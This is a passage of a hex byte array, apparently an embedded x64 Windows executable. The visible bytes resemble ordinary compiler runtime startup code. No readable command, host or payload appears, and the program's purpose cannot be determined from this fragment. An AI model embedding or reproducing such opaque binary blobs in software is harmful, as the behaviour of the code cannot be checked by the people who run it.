0x48, 0x85, 0xC9, 0x74, 0x0A, 0xE8, 0x75,	0x01, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0xEB, 0x02, 0x33, 0xFF, 0x4C, 0x8B,	0x44, 0x24, 0x78, 0x49, 0x8B, 0xD4, 0x4C, 0x89, 0x7E, 0x10, 0x48, 0x8B,	0xCF, 0x48, 0x89, 0x5E, 0x18, 0x4E, 0x8D, 0x3C, 0x07, 0x48, 0x83, 0xFD,	0x10, 0x72, 0x4D, 0x48, 0x8B, 0x1E, 0xE8, 0x2C, 0x10, 0x00, 0x00, 0x4D,	0x8D, 0x46, 0x01, 0x48, 0x8B, 0xD3, 0x49, 0x8B, 0xCF, 0xE8, 0x1D, 0x10,	0x00, 0x00, 0x48, 0x8D, 0x55, 0x01, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00,	0x00, 0x72, 0x18, 0x48, 0x8B, 0x4B, 0xF8, 0x48, 0x83, 0xC2, 0x27, 0x48,	0x2B, 0xD9, 0x48, 0x8D, 0x43, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x77, 0x0D,	0x48, 0x8B, 0xD9, 0x48, 0x8B, 0xCB, 0xE8, 0xD9, 0x00, 0x00, 0x00, 0xEB,	0x1B, 0xFF, 0x15, 0xE5, 0x16, 0x00, 0x00, 0xCC, 0xE8, 0xE2, 0x0F, 0x00,	0x00, 0x4D, 0x8D, 0x46, 0x01, 0x48, 0x8B, 0xD6, 0x49, 0x8B, 0xCF, 0xE8,	0xD3, 0x0F, 0x00, 0x00, 0x48, 0x89, 0x3E, 0x48, 0x8B, 0xC6, 0x48, 0x8B,	0x7C, 0x24, 0x68, 0x48, 0x8B, 0x6C, 0x24, 0x60, 0x4C, 0x8B, 0x7C, 0x24,	0x20, 0x48, 0x83, 0xC4, 0x28, 0x41, 0x5E, 0x41, 0x5C, 0x5E, 0x5B, 0xC3,	0xE8, 0x93, 0xD5, 0xFF, 0xFF, 0xCC, 0xE8, 0x2D, 0xD6, 0xFF, 0xFF, 0xCC,	0x48, 0x63, 0x41, 0xFC, 0x48, 0x2B, 0xC8, 0xE9, 0x00, 0xF2, 0xFF, 0xFF,	0xFF, 0x25, 0x6A, 0x15, 0x00, 0x00, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83,	0xEC, 0x20, 0x48, 0x8B, 0xD9, 0xB9, 0x10, 0x00, 0x00, 0x00, 0xE8, 0x9D,	0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0x85, 0xC0, 0x74,	0x0E, 0x48, 0x8B, 0x15, 0xA4, 0x46, 0x00, 0x00, 0x48, 0x89, 0x10, 0x48,	0x89, 0x58, 0x08, 0x48, 0x89, 0x05, 0x96, 0x46, 0x00, 0x00, 0x48, 0x83,	0xC4, 0x20, 0x5B, 0xC3, 0xFF, 0x25, 0xDA, 0x14, 0x00, 0x00, 0xFF, 0x25,	0xDC, 0x14, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,	0x48, 0x3B, 0x0D, 0xA9, 0x43, 0x00, 0x00, 0xF2, 0x75, 0x12, 0x48, 0xC1,	0xC1, 0x10, 0x66, 0xF7, 0xC1, 0xFF, 0xFF, 0xF2, 0x75, 0x02, 0xF2, 0xC3,	0x48, 0xC1, 0xC9, 0x10, 0xE9, 0x8B, 0x07, 0x00, 0x00, 0xCC, 0xCC, 0xCC,	0xE9, 0xCB, 0x08, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83,	0xEC, 0x20, 0x48, 0x8D, 0x05, 0x1F, 0x17, 0x00, 0x00, 0x48, 0x8B, 0xD9,	0x48, 0x89, 0x01, 0xF6, 0xC2, 0x01, 0x74, 0x0A, 0xBA, 0x18, 0x00, 0x00,	0x00, 0xE8, 0xD6, 0xFF, 0xFF, 0xFF, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4,	0x20, 0x5B, 0xC3, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,	0xD9, 0xEB, 0x0F, 0x48, 0x8B, 0xCB, 0xE8, 0x79, 0x0D, 0x00, 0x00, 0x85,	0xC0, 0x74, 0x13, 0x48, 0x8B, 0xCB, 0xE8, 0x73, 0x0D, 0x00, 0x00, 0x48,	0x85, 0xC0, 0x74, 0xE7, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0x48, 0x83,	0xFB, 0xFF, 0x74, 0x06, 0xE8, 0x8F, 0x08, 0x00, 0x00, 0xCC, 0xE8, 0x8D,	0xD4, 0xFF, 0xFF, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x85, 0xD2, 0x74, 0x39,	0x83, 0xEA, 0x01, 0x74, 0x28, 0x83, 0xEA, 0x01, 0x74, 0x16, 0x83, 0xFA,	0x01, 0x74, 0x0A, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28,	0xC3, 0xE8, 0xEA, 0x03, 0x00, 0x00, 0xEB, 0x05, 0xE8, 0xBB, 0x03, 0x00,	0x00, 0x0F, 0xB6, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x49, 0x8B, 0xD0,	0x48, 0x83, 0xC4, 0x28, 0xE9, 0x0F, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xC0,	0x0F, 0x95, 0xC1, 0x48, 0x83, 0xC4, 0x28, 0xE9, 0x18, 0x01, 0x00, 0x00,	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89,	0x7C, 0x24, 0x20, 0x41, 0x56, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xF2,	0x4C, 0x8B, 0xF1, 0x33, 0xC9, 0xE8, 0x5A, 0x04, 0x00, 0x00, 0x84, 0xC0,	0x0F, 0x84, 0xC8, 0x00, 0x00, 0x00, 0xE8, 0xE1, 0x02, 0x00, 0x00, 0x8A,	0xD8, 0x88, 0x44, 0x24, 0x40, 0x40, 0xB7, 0x01, 0x83, 0x3D, 0x5D, 0x45,	0x00, 0x00, 0x00, 0x0F, 0x85, 0xC5, 0x00, 0x00, 0x00, 0xC7, 0x05, 0x4D,	0x45, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0xE8, 0x2C, 0x03, 0x00, 0x00,	0x84, 0xC0, 0x74, 0x4F, 0xE8, 0x43, 0x0A, 0x00, 0x00, 0xE8, 0xA2, 0x08,	0x00, 0x00, 0xE8, 0xC1, 0x08, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xD6, 0x15,	0x00, 0x00, 0x48, 0x8D, 0x0D, 0xC7, 0x15, 0x00, 0x00, 0xE8, 0x98, 0x0C,	0x00, 0x00, 0x85, 0xC0, 0x75, 0x29, 0xE8, 0xC9, 0x02, 0x00, 0x00, 0x84,	0xC0, 0x74, 0x20, 0x48, 0x8D, 0x15, 0xA6, 0x15, 0x00, 0x00, 0x48, 0x8D,	0x0D, 0x8F, 0x15, 0x00, 0x00, 0xE8, 0x72, 0x0C, 0x00, 0x00, 0xC7, 0x05,	0xF8, 0x44, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x40, 0x32, 0xFF, 0x8A,	0xCB, 0xE8, 0x3E, 0x05, 0x00, 0x00, 0x40, 0x84, 0xFF, 0x75, 0x3F, 0xE8,	0x8C, 0x08, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x83, 0x38, 0x00, 0x74,	0x24, 0x48, 0x8B, 0xC8, 0xE8, 0x8B, 0x04, 0x00, 0x00, 0x84, 0xC0, 0x74,	0x18, 0x4C, 0x8B, 0xC6, 0xBA, 0x02, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xCE,	0x48, 0x8B, 0x03, 0x4C, 0x8B, 0x0D, 0x2A, 0x15, 0x00, 0x00, 0x41, 0xFF,	0xD1, 0xFF, 0x05, 0xAD, 0x44, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00,	0xEB, 0x02, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x74,	0x24, 0x38, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x20, 0x41,	0x5E, 0xC3, 0xB9, 0x07, 0x00, 0x00, 0x00, 0xE8, 0x40, 0x08, 0x00, 0x00,	0x90, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83,	0xEC, 0x30, 0x40, 0x8A, 0xF9, 0x8B, 0x05, 0x6D, 0x44, 0x00, 0x00, 0x85,	0xC0, 0x7F, 0x0D, 0x33, 0xC0, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83,	0xC4, 0x30, 0x5F, 0xC3, 0xFF, 0xC8, 0x89, 0x05, 0x54, 0x44, 0x00, 0x00,	0xE8, 0xC7, 0x01, 0x00, 0x00, 0x8A, 0xD8, 0x88, 0x44, 0x24, 0x20, 0x83,	0x3D, 0x46, 0x44, 0x00, 0x00, 0x02, 0x75, 0x37, 0xE8, 0xDB, 0x02, 0x00,	0x00, 0xE8, 0xB2, 0x07, 0x00, 0x00, 0xE8, 0x75, 0x09, 0x00, 0x00, 0x83,	0x25, 0x2E, 0x44, 0x00, 0x00, 0x00, 0x8A, 0xCB, 0xE8, 0x77, 0x04, 0x00,	0x00, 0x33, 0xD2, 0x40, 0x8A, 0xCF, 0xE8, 0x91, 0x04, 0x00, 0x00, 0xF6,	0xD8, 0x1B, 0xDB, 0x83, 0xE3, 0x01, 0xE8, 0xDD, 0x02, 0x00, 0x00, 0x8B,	0xC3, 0xEB, 0xA2, 0xB9, 0x07, 0x00, 0x00, 0x00, 0xE8, 0xBB, 0x07, 0x00,	0x00, 0x90, 0x90, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x20, 0x4C,	0x89, 0x40, 0x18, 0x89, 0x50, 0x10, 0x48, 0x89, 0x48, 0x08, 0x56, 0x57,	0x41, 0x56, 0x48, 0x83, 0xEC, 0x40, 0x49, 0x8B, 0xF0, 0x8B, 0xFA, 0x4C,	0x8B, 0xF1, 0x85, 0xD2, 0x75, 0x0F, 0x39, 0x15, 0xD0, 0x43, 0x00, 0x00,	0x7F, 0x07, 0x33, 0xC0, 0xE9, 0xEE, 0x00, 0x00, 0x00, 0x8D, 0x42, 0xFF,	0x83, 0xF8, 0x01, 0x77, 0x45, 0x48, 0x8B, 0x05, 0x9C, 0x14, 0x00, 0x00,	0x48, 0x85, 0xC0, 0x75, 0x0A, 0xC7, 0x44, 0x24, 0x30, 0x01, 0x00, 0x00,	0x00, 0xEB, 0x14, 0xFF, 0x15, 0x17, 0x14, 0x00, 0x00, 0x8B, 0xD8, 0x89,	0x44, 0x24, 0x30, 0x85, 0xC0, 0x0F, 0x84, 0xB2, 0x00, 0x00, 0x00, 0x4C,	0x8B, 0xC6, 0x8B, 0xD7, 0x49, 0x8B, 0xCE, 0xE8, 0xA0, 0xFD, 0xFF, 0xFF,	0x8B, 0xD8, 0x89, 0x44, 0x24, 0x30, 0x85, 0xC0, 0x0F, 0x84, 0x97, 0x00,	0x00, 0x00, 0x4C, 0x8B, 0xC6, 0x8B, 0xD7, 0x49, 0x8B, 0xCE, 0xE8, 0x21,	0xE0, 0xFF, 0xFF, 0x8B, 0xD8, 0x89, 0x44, 0x24, 0x30, 0x83, 0xFF, 0x01,	0x75, 0x36, 0x85, 0xC0, 0x75, 0x32, 0x4C, 0x8B, 0xC6, 0x33, 0xD2, 0x49,	0x8B, 0xCE, 0xE8, 0x05, 0xE0, 0xFF, 0xFF, 0x48, 0x85, 0xF6, 0x0F, 0x95,	0xC1, 0xE8, 0xC6, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0x05, 0x23, 0x14, 0x00,	0x00, 0x48, 0x85, 0xC0, 0x74, 0x0E, 0x4C, 0x8B, 0xC6, 0x33, 0xD2, 0x49,	0x8B, 0xCE, 0xFF, 0x15, 0xA0, 0x13, 0x00, 0x00, 0x85, 0xFF, 0x74, 0x05,	0x83, 0xFF, 0x03, 0x75, 0x40, 0x4C, 0x8B, 0xC6, 0x8B, 0xD7, 0x49, 0x8B,	0xCE, 0xE8, 0x2E, 0xFD, 0xFF, 0xFF, 0x8B, 0xD8, 0x89, 0x44, 0x24, 0x30,	0x85, 0xC0, 0x74, 0x29, 0x48, 0x8B, 0x05, 0xE9, 0x13, 0x00, 0x00, 0x48,	0x85, 0xC0, 0x75, 0x09, 0x8D, 0x58, 0x01, 0x89, 0x5C, 0x24, 0x30, 0xEB,	0x14, 0x4C, 0x8B, 0xC6, 0x8B, 0xD7, 0x49, 0x8B, 0xCE, 0xFF, 0x15, 0x5D,	0x13, 0x00, 0x00, 0x8B, 0xD8, 0x89, 0x44, 0x24, 0x30, 0xEB, 0x06, 0x33,	0xDB, 0x89, 0x5C, 0x24, 0x30, 0x8B, 0xC3, 0x48, 0x8B, 0x5C, 0x24, 0x78,	0x48, 0x83, 0xC4, 0x40, 0x41, 0x5E, 0x5F, 0x5E, 0xC3, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48,	0x83, 0xEC, 0x20, 0x49, 0x8B, 0xF8, 0x8B, 0xDA, 0x48, 0x8B, 0xF1, 0x83,	0xFA, 0x01, 0x75, 0x05, 0xE8, 0x67, 0x05, 0x00, 0x00, 0x4C, 0x8B, 0xC7,	0x8B, 0xD3, 0x48, 0x8B, 0xCE, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B,	0x74, 0x24, 0x38, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xE9, 0x8F, 0xFE, 0xFF,	0xFF, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0xAB, 0x09, 0x00,	0x00, 0x85, 0xC0, 0x74, 0x21, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00,	0x00, 0x00, 0x48, 0x8B, 0x48, 0x08, 0xEB, 0x05, 0x48, 0x3B, 0xC8, 0x74,	0x14, 0x33, 0xC0, 0xF0, 0x48, 0x0F, 0xB1, 0x0D, 0x68, 0x42, 0x00, 0x00,	0x75, 0xEE, 0x32, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xB0, 0x01, 0xEB,	0xF7, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0xE8, 0x6F, 0x09, 0x00,	0x00, 0x85, 0xC0, 0x74, 0x07, 0xE8, 0xBA, 0x07, 0x00, 0x00, 0xEB, 0x19,	0xE8, 0x57, 0x09, 0x00, 0x00, 0x8B, 0xC8, 0xE8, 0xB2, 0x09, 0x00, 0x00,	0x85, 0xC0, 0x74, 0x04, 0x32, 0xC0, 0xEB, 0x07, 0xE8, 0xAB, 0x09, 0x00,	0x00, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x83, 0xEC, 0x28,	0x33, 0xC9, 0xE8, 0x3D, 0x01, 0x00, 0x00, 0x84, 0xC0, 0x0F, 0x95, 0xC0,	0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,	0xE8, 0xB3, 0x09, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x04, 0x32, 0xC0, 0xEB,	0x12, 0xE8, 0xA6, 0x09, 0x00, 0x00, 0x84, 0xC0, 0x75, 0x07, 0xE8, 0x9D,	0x09, 0x00, 0x00, 0xEB, 0xEC, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x28, 0xC3,	0x48, 0x83, 0xEC, 0x28, 0xE8, 0x8B, 0x09, 0x00, 0x00, 0xE8, 0x86, 0x09,	0x00, 0x00, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x6C, 0x24, 0x10, 0x48, 0x89,	0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x49, 0x8B, 0xF9, 0x49,	0x8B, 0xF0, 0x8B, 0xDA, 0x48, 0x8B, 0xE9, 0xE8, 0xC8, 0x08, 0x00, 0x00,	0x85, 0xC0, 0x75, 0x16, 0x83, 0xFB, 0x01, 0x75, 0x11, 0x4C, 0x8B, 0xC6,	0x33, 0xD2, 0x48, 0x8B, 0xCD, 0x48, 0x8B, 0xC7, 0xFF, 0x15, 0xF6, 0x11,	0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x58, 0x8B, 0x4C, 0x24, 0x50, 0x48,	0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B, 0x6C, 0x24, 0x38, 0x48, 0x8B, 0x74,	0x24, 0x40, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xE9, 0xE0, 0x08, 0x00, 0x00,	0x48, 0x83, 0xEC, 0x28, 0xE8, 0x83, 0x08, 0x00, 0x00, 0x85, 0xC0, 0x74,	0x10, 0x48, 0x8D, 0x0D, 0x68, 0x41, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28,	0xE9, 0xE1, 0x08, 0x00, 0x00, 0xE8, 0xFE, 0x08, 0x00, 0x00, 0x85, 0xC0,	0x75, 0x05, 0xE8, 0xDF, 0x08, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3,	0x48, 0x83, 0xEC, 0x28, 0x33, 0xC9, 0xE8, 0xE1, 0x08, 0x00, 0x00, 0x48,	0x83, 0xC4, 0x28, 0xE9, 0xD8, 0x08, 0x00, 0x00, 0x40, 0x53, 0x48, 0x83,	0xEC, 0x20, 0x0F, 0xB6, 0x05, 0x23, 0x41, 0x00, 0x00, 0x85, 0xC9, 0xBB,	0x01, 0x00, 0x00, 0x00, 0x0F, 0x44, 0xC3, 0x88, 0x05, 0x13, 0x41, 0x00,	0x00, 0xE8, 0x7A, 0x06, 0x00, 0x00, 0xE8, 0xB1, 0x08, 0x00, 0x00, 0x84,	0xC0, 0x75, 0x04, 0x32, 0xC0, 0xEB, 0x14, 0xE8, 0xA4, 0x08, 0x00, 0x00,	0x84, 0xC0, 0x75, 0x09, 0x33, 0xC9, 0xE8, 0x99, 0x08, 0x00, 0x00, 0xEB,	0xEA, 0x8A, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC,	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x80, 0x3D, 0xD8, 0x40, 0x00, 0x00,	0x00, 0x8B, 0xD9, 0x75, 0x67, 0x83, 0xF9, 0x01, 0x77, 0x6A, 0xE8, 0xE1,	0x07, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x28, 0x85, 0xDB, 0x75, 0x24, 0x48,	0x8D, 0x0D, 0xC2, 0x40, 0x00, 0x00, 0xE8, 0x33, 0x08, 0x00, 0x00, 0x85,	0xC0, 0x75, 0x10, 0x48, 0x8D, 0x0D, 0xCA, 0x40, 0x00, 0x00, 0xE8, 0x23,	0x08, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x2E, 0x32, 0xC0, 0xEB, 0x33, 0x66,	0x0F, 0x6F, 0x05, 0x75, 0x11, 0x00, 0x00, 0x48, 0x83, 0xC8, 0xFF, 0xF3,	0x0F, 0x7F, 0x05, 0x91, 0x40, 0x00, 0x00, 0x48, 0x89, 0x05, 0x9A, 0x40,	0x00, 0x00, 0xF3, 0x0F, 0x7F, 0x05, 0x9A, 0x40, 0x00, 0x00, 0x48, 0x89,	0x05, 0xA3, 0x40, 0x00, 0x00, 0xC6, 0x05, 0x6D, 0x40, 0x00, 0x00, 0x01,	0xB0, 0x01, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xB9, 0x05, 0x00, 0x00,	0x00, 0xE8, 0x02, 0x04, 0x00, 0x00, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x18,	0x4C, 0x8B, 0xC1, 0xB8, 0x4D, 0x5A, 0x00, 0x00, 0x66, 0x39, 0x05, 0x55,	0xBD, 0xFF, 0xFF, 0x75, 0x78, 0x48, 0x63, 0x0D, 0x88, 0xBD, 0xFF, 0xFF,	0x48, 0x8D, 0x15, 0x45, 0xBD, 0xFF, 0xFF, 0x48, 0x03, 0xCA, 0x81, 0x39,	0x50, 0x45, 0x00, 0x00, 0x75, 0x5F, 0xB8, 0x0B, 0x02, 0x00, 0x00, 0x66,	0x39, 0x41, 0x18, 0x75, 0x54, 0x4C, 0x2B, 0xC2, 0x0F, 0xB7, 0x41, 0x14,	0x48, 0x8D, 0x51, 0x18, 0x48, 0x03, 0xD0, 0x0F, 0xB7, 0x41, 0x06, 0x48,	0x8D, 0x0C, 0x80, 0x4C, 0x8D, 0x0C, 0xCA, 0x48, 0x89, 0x14, 0x24, 0x49,	0x3B, 0xD1, 0x74, 0x18, 0x8B, 0x4A, 0x0C, 0x4C, 0x3B, 0xC1, 0x72, 0x0A,	0x8B, 0x42, 0x08, 0x03, 0xC1, 0x4C, 0x3B, 0xC0, 0x72, 0x08, 0x48, 0x83,	0xC2, 0x28, 0xEB, 0xDF, 0x33, 0xD2, 0x48, 0x85, 0xD2, 0x75, 0x04, 0x32,	0xC0, 0xEB, 0x14, 0x83, 0x7A, 0x24, 0x00, 0x7D, 0x04, 0x32, 0xC0, 0xEB,	0x0A, 0xB0, 0x01, 0xEB, 0x06, 0x32, 0xC0, 0xEB, 0x02, 0x32, 0xC0, 0x48,	0x83, 0xC4, 0x18, 0xC3, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x8A, 0xD9,	0xE8, 0xCB, 0x06, 0x00, 0x00, 0x33, 0xD2, 0x85, 0xC0, 0x74, 0x0B, 0x84,	0xDB, 0x75, 0x07, 0x48, 0x87, 0x15, 0x9A, 0x3F, 0x00, 0x00, 0x48, 0x83,	0xC4, 0x20, 0x5B, 0xC3, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x80, 0x3D,	0x8F, 0x3F, 0x00, 0x00, 0x00, 0x8A, 0xD9, 0x74, 0x04, 0x84, 0xD2, 0x75,	0x0C, 0xE8, 0x2A, 0x07, 0x00, 0x00, 0x8A, 0xCB, 0xE8, 0x23, 0x07, 0x00,	0x00, 0xB0, 0x01, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC,	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x83, 0x3D, 0x6A, 0x3F, 0x00,	0x00, 0xFF, 0x48, 0x8B, 0xD9, 0x75, 0x07, 0xE8, 0xE8, 0x06, 0x00, 0x00,	0xEB, 0x0F, 0x48, 0x8B, 0xD3, 0x48, 0x8D, 0x0D, 0x54, 0x3F, 0x00, 0x00,	0xE8, 0xCB, 0x06, 0x00, 0x00, 0x33, 0xD2, 0x85, 0xC0, 0x48, 0x0F, 0x44,	0xD3, 0x48, 0x8B, 0xC2, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC,	0x48, 0x83, 0xEC, 0x28, 0xE8, 0xBB, 0xFF, 0xFF, 0xFF, 0x48, 0xF7, 0xD8,	0x1B, 0xC0, 0xF7, 0xD8, 0xFF, 0xC8, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC,	0xC2, 0x00, 0x00, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,	0xD9, 0x33, 0xC9, 0xFF, 0x15, 0x7F, 0x0C, 0x00, 0x00, 0x48, 0x8B, 0xCB,	0xFF, 0x15, 0x6E, 0x0C, 0x00, 0x00, 0xFF, 0x15, 0x50, 0x0C, 0x00, 0x00,	0x48, 0x8B, 0xC8, 0xBA, 0x09, 0x04, 0x00, 0xC0, 0x48, 0x83, 0xC4, 0x20,	0x5B, 0x48, 0xFF, 0x25, 0x64, 0x0C, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x24,	0x08, 0x48, 0x83, 0xEC, 0x38, 0xB9, 0x17, 0x00, 0x00, 0x00, 0xE8, 0x73,	0x06, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x07, 0xB9, 0x02, 0x00, 0x00, 0x00,	0xCD, 0x29, 0x48, 0x8D, 0x0D, 0x9F, 0x3F, 0x00, 0x00, 0xE8, 0xAA, 0x00,	0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x38, 0x48, 0x89, 0x05, 0x86, 0x40,	0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x38, 0x48, 0x83, 0xC0, 0x08, 0x48,	0x89, 0x05, 0x16, 0x40, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x6F, 0x40, 0x00,	0x00, 0x48, 0x89, 0x05, 0xE0, 0x3E, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24,	0x40, 0x48, 0x89, 0x05, 0xE4, 0x3F, 0x00, 0x00, 0xC7, 0x05, 0xBA, 0x3E,	0x00, 0x00, 0x09, 0x04, 0x00, 0xC0, 0xC7, 0x05, 0xB4, 0x3E, 0x00, 0x00,	0x01, 0x00, 0x00, 0x00, 0xC7, 0x05, 0xBE, 0x3E, 0x00, 0x00, 0x01, 0x00,	0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48,	0x8D, 0x0D, 0xB6, 0x3E, 0x00, 0x00, 0x48, 0xC7, 0x04, 0x01, 0x02, 0x00,	0x00, 0x00, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x00, 0x48,	0x8B, 0x0D, 0x5E, 0x3B, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x04, 0x20, 0xB8,	0x08, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0, 0x01, 0x48, 0x8B, 0x0D, 0x41,	0x3B, 0x00, 0x00, 0x48, 0x89, 0x4C, 0x04, 0x20, 0x48, 0x8D, 0x0D, 0x0D,	0x0F, 0x00, 0x00, 0xE8, 0x00, 0xFF, 0xFF, 0xFF, 0x48, 0x83, 0xC4, 0x38,	0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x56, 0x57, 0x48, 0x83, 0xEC, 0x40,	0x48, 0x8B, 0xD9, 0xFF, 0x15, 0xB7, 0x0B, 0x00, 0x00, 0x48, 0x8B, 0xB3,	0xF8, 0x00, 0x00, 0x00, 0x33, 0xFF, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x54,	0x24, 0x60, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x1D, 0x0B, 0x00, 0x00, 0x48,	0x85, 0xC0, 0x74, 0x39, 0x48, 0x83, 0x64, 0x24, 0x38, 0x00, 0x48, 0x8D,	0x4C, 0x24, 0x68, 0x48, 0x8B, 0x54, 0x24, 0x60, 0x4C, 0x8B, 0xC8, 0x48,	0x89, 0x4C, 0x24, 0x30, 0x4C, 0x8B, 0xC6, 0x48, 0x8D, 0x4C, 0x24, 0x70,	0x48, 0x89, 0x4C, 0x24, 0x28, 0x33, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x20,	0xFF, 0x15, 0x16, 0x0B, 0x00, 0x00, 0xFF, 0xC7, 0x83, 0xFF, 0x02, 0x7C,	0xB1, 0x48, 0x83, 0xC4, 0x40, 0x5F, 0x5E, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC,	0xE9, 0x33, 0x05, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0x61, 0x10,	0x00, 0x48, 0x8D, 0x05, 0xB8, 0x0E, 0x00, 0x00, 0x48, 0x89, 0x41, 0x08,	0x48, 0x8D, 0x05, 0x9D, 0x0E, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x8B,	0xC1, 0xC3, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x4C, 0x24,	0x20, 0xE8, 0xD2, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x3F, 0x23, 0x00,	0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x97, 0x04, 0x00, 0x00, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x20, 0x55, 0x48, 0x8B, 0xEC, 0x48, 0x83, 0xEC,	0x20, 0x48, 0x8B, 0x05, 0x60, 0x3A, 0x00, 0x00, 0x48, 0xBB, 0x32, 0xA2,	0xDF, 0x2D, 0x99, 0x2B, 0x00, 0x00, 0x48, 0x3B, 0xC3, 0x75, 0x74, 0x48,	0x83, 0x65, 0x18, 0x00, 0x48, 0x8D, 0x4D, 0x18, 0xFF, 0x15, 0xC2, 0x0A,	0x00, 0x00, 0x48, 0x8B, 0x45, 0x18, 0x48, 0x89, 0x45, 0x10, 0xFF, 0x15,	0xAC, 0x0A, 0x00, 0x00, 0x8B, 0xC0, 0x48, 0x31, 0x45, 0x10, 0xFF, 0x15,	0x58, 0x0A, 0x00, 0x00, 0x8B, 0xC0, 0x48, 0x8D, 0x4D, 0x20, 0x48, 0x31,	0x45, 0x10, 0xFF, 0x15, 0x88, 0x0A, 0x00, 0x00, 0x8B, 0x45, 0x20, 0x48,	0x8D, 0x4D, 0x10, 0x48, 0xC1, 0xE0, 0x20, 0x48, 0x33, 0x45, 0x20, 0x48,	0x33, 0x45, 0x10, 0x48, 0x33, 